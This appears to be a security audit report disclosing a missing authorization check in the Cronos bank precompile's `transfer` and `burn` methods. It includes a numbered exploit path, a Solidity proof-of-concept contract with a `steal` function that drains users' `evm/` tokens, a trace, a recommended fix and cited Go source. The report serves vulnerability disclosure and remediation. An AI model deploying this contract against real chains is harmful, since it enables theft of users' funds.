### Title
Unauthorized Transfer of Native `evm/` Tokens via Bank Precompile `transfer` Method — (`File: x/cronos/keeper/precompiles/bank.go`)

### Summary
The bank precompile's `transfer` method accepts an arbitrary `sender` address as a call argument and moves `evm/{callerContract}` native tokens from that address to any recipient, with no check that the EVM caller is authorized to spend on behalf of `sender`. Any deployed contract can therefore drain `evm/` native-token balances from any account that holds tokens issued by that contract, without the account owner's consent.

### Finding Description

**Root cause — `x/cronos/keeper/precompiles/bank.go`, `TransferMethodName` branch (lines 167–200):**

```go
case TransferMethodName:
    args, err := method.Inputs.Unpack(contract.Input[4:])
    sender    := args[0].(common.Address)   // ← attacker-controlled
    recipient := args[1].(common.Address)
    amount    := args[2].(*big.Int)
    from := sdk.AccAddress(sender.Bytes())
    to   := sdk.AccAddress(recipient.Bytes())
    denom := EVMDenom(contract.Caller())    // "evm/0x<callerContract>"
    amt   := sdk.NewCoin(denom, sdkmath.NewIntFromBigInt(amount))
    err = stateDB.ExecuteNativeAction(precompileAddr, nil, func(ctx sdk.Context) error {
        ...
        return bc.bankKeeper.SendCoins(ctx, from, to, sdk.NewCoins(amt))
    })
```

`sender` (→ `from`) is taken directly from the ABI-decoded arguments. There is no check that `sender == contract.Caller()` (the EVM contract invoking the precompile), nor any allowance/approval mechanism. `bankKeeper.SendCoins` is called unconditionally with the attacker-supplied `from` address.

**Exploit path (no privileged keys required):**

1. Attacker deploys `MaliciousContract` on Cronos EVM (normal user action).
2. `MaliciousContract` exposes a `deposit(uint256 amount)` function that:
   - Burns the caller's ERC-20 tokens (`_burn(msg.sender, amount)`).
   - Calls `bank.mint(msg.sender, amount)` → mints `evm/0x{MaliciousContract}` native tokens to the victim.
3. Victim calls `deposit(100)`, burning 100 ERC-20 tokens and receiving 100 `evm/0x{MaliciousContract}` native tokens.
4. Attacker calls `MaliciousContract.steal(victimAddress, attackerAddress, 100)`, which internally calls `bank.transfer(victimAddress, attackerAddress, 100)`.
5. The bank precompile executes `bankKeeper.SendCoins(ctx, victim, attacker, 100 evm/0x{MaliciousContract})` — no authorization check fires.
6. Victim's 100 `evm/` tokens (backed by burned ERC-20 value) are now in the attacker's account. The victim cannot recover them via `moveFromNative` because they no longer hold the native tokens.

The same design flaw exists in the `burn` branch (lines 113–156): `recipient` (the address whose tokens are burned) is also taken from call arguments with no authorization check, allowing a contract to destroy any user's `evm/` balance.

### Impact Explanation

**Critical — Unauthorized transfer/burn of precompile-controlled assets.**

`evm/{contractAddress}` tokens are native Cosmos-SDK bank tokens managed exclusively by the bank precompile. They represent real value: they are minted in exchange for burned ERC-20 tokens and can be redeemed back via `burn` + ERC-20 re-mint. An attacker contract can:

- **Transfer** `evm/` tokens from any victim to any address (theft).
- **Burn** `evm/` tokens from any victim (permanent destruction of value).

Both actions require zero privileged access — only the ability to deploy an EVM contract and call the bank precompile.

### Likelihood Explanation

Any contract developer on Cronos can trigger this. A realistic attack vector is a DeFi protocol that uses the bank precompile for native-token accounting; the deployer retains the ability to drain all user balances at will. Users have no on-chain mechanism to detect or prevent this.

### Recommendation

In the `transfer` branch, enforce that the `sender` argument equals the EVM caller (the contract invoking the precompile):

```go
// Add after unpacking args:
if sender != contract.Caller() {
    return nil, errors.New("transfer: sender must be the calling contract")
}
```

Alternatively, mirror the ERC-20 allowance model: require an explicit approval from `sender` before a third-party contract can move their `evm/` tokens.

Apply the same fix to the `burn` branch: only allow a contract to burn tokens from its own address, or from an address that has explicitly approved the burn.

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IBankModule {
    function mint(address, uint256) external payable returns (bool);
    function burn(address, uint256) external payable returns (bool);
    function transfer(address, address, uint256) external payable returns (bool);
}

contract MaliciousBank {
    IBankModule constant bank = IBankModule(0x0000000000000000000000000000000000000064);

    // Step 1: victim calls this, burning their ERC-20 equivalent and
    //         receiving evm/0x{this} native tokens
    function deposit(uint256 amount) external {
        // (assume ERC-20 burn logic here)
        bank.mint(msg.sender, amount);
    }

    // Step 2: attacker calls this at any time to drain victim's evm/ balance
    function steal(address victim, address attacker, uint256 amount) external {
        // No authorization check in the precompile — succeeds unconditionally
        bank.transfer(victim, attacker, amount);
    }
}
```

**Trace:**
- `victim.deposit(100)` → `bank.mint(victim, 100)` → victim holds `100 evm/0x{MaliciousBank}`
- `attacker.steal(victim, attacker, 100)` → `bank.transfer(victim, attacker, 100)` → precompile calls `bankKeeper.SendCoins(victim→attacker, 100 evm/0x{MaliciousBank})` — **no auth check, succeeds**
- Victim balance: 0. Attacker balance: 100. Victim's original ERC-20 tokens are permanently burned. [1](#0-0) [2](#0-1) [3](#0-2) [4](#0-3)

### Citations

**File:** x/cronos/keeper/precompiles/bank.go (L56-58)
```go
func EVMDenom(token common.Address) string {
	return EVMDenomPrefix + token.Hex()
}
```

**File:** x/cronos/keeper/precompiles/bank.go (L113-156)
```go
	case MintMethodName, BurnMethodName:
		if readonly {
			return nil, errors.New("the method is not readonly")
		}
		args, err := method.Inputs.Unpack(contract.Input[4:])
		if err != nil {
			return nil, errors.New("fail to unpack input arguments")
		}
		recipient := args[0].(common.Address)
		amount := args[1].(*big.Int)
		if amount.Sign() <= 0 {
			return nil, errors.New("invalid amount")
		}
		addr := sdk.AccAddress(recipient.Bytes())
		if err := bc.checkBlockedAddr(addr); err != nil {
			return nil, err
		}
		denom := EVMDenom(contract.Caller())
		amt := sdk.NewCoin(denom, sdkmath.NewIntFromBigInt(amount))
		err = stateDB.ExecuteNativeAction(precompileAddr, nil, func(ctx sdk.Context) error {
			if err := bc.bankKeeper.IsSendEnabledCoins(ctx, amt); err != nil {
				return err
			}
			if method.Name == "mint" {
				if err := bc.bankKeeper.MintCoins(ctx, types.ModuleName, sdk.NewCoins(amt)); err != nil {
					return errorsmod.Wrap(err, "fail to mint coins in precompiled contract")
				}
				if err := bc.bankKeeper.SendCoinsFromModuleToAccount(ctx, types.ModuleName, addr, sdk.NewCoins(amt)); err != nil {
					return errorsmod.Wrap(err, "fail to send mint coins to account")
				}
			} else {
				if err := bc.bankKeeper.SendCoinsFromAccountToModule(ctx, addr, types.ModuleName, sdk.NewCoins(amt)); err != nil {
					return errorsmod.Wrap(err, "fail to send burn coins to module")
				}
				if err := bc.bankKeeper.BurnCoins(ctx, types.ModuleName, sdk.NewCoins(amt)); err != nil {
					return errorsmod.Wrap(err, "fail to burn coins in precompiled contract")
				}
			}
			return nil
		})
		if err != nil {
			return nil, err
		}
		return method.Outputs.Pack(true)
```

**File:** x/cronos/keeper/precompiles/bank.go (L167-200)
```go
	case TransferMethodName:
		if readonly {
			return nil, errors.New("the method is not readonly")
		}
		args, err := method.Inputs.Unpack(contract.Input[4:])
		if err != nil {
			return nil, errors.New("fail to unpack input arguments")
		}
		sender := args[0].(common.Address)
		recipient := args[1].(common.Address)
		amount := args[2].(*big.Int)
		if amount.Sign() <= 0 {
			return nil, errors.New("invalid amount")
		}
		from := sdk.AccAddress(sender.Bytes())
		to := sdk.AccAddress(recipient.Bytes())
		if err := bc.checkBlockedAddr(to); err != nil {
			return nil, err
		}
		denom := EVMDenom(contract.Caller())
		amt := sdk.NewCoin(denom, sdkmath.NewIntFromBigInt(amount))
		err = stateDB.ExecuteNativeAction(precompileAddr, nil, func(ctx sdk.Context) error {
			if err := bc.bankKeeper.IsSendEnabledCoins(ctx, amt); err != nil {
				return err
			}
			if err := bc.bankKeeper.SendCoins(ctx, from, to, sdk.NewCoins(amt)); err != nil {
				return errorsmod.Wrap(err, "fail to send coins in precompiled contract")
			}
			return nil
		})
		if err != nil {
			return nil, err
		}
		return method.Outputs.Pack(true)
```

**File:** x/cronos/events/bindings/src/Bank.sol (L1-9)
```text
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

interface IBankModule {
    function mint(address,uint256) external payable returns (bool);
    function balanceOf(address,address) external view returns (uint256);
    function burn(address,uint256) external payable returns (bool);
    function transfer(address,address,uint256) external payable returns (bool);
}
```
